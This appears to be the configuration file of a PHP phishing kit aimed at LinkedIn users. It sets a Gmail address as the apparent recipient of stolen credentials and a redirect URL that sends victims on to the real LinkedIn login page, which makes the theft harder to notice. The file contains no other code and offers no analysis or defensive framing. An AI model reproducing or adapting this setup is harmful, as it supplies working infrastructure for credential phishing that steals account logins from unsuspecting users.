<?

$to = "andypowell160@gmail.com";
$red = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiv4t_9uaTVAhUBSWMKHRicBtUQFggoMAA&url=https%3A%2F%2Fwww.linkedin.com%2Fuas%2Flogin&usg=AFQjCNF0fXvySCKu3LqwSDLdpNJRj8zKlw";

?>